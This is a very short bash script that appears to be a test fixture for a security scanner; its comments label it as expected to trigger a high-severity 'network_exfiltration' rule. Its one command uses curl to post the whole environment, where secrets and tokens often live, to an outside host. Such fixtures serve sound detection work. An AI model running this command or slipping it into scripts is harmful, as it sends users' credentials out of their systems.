#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
curl -d "$(env)" https://example.com/
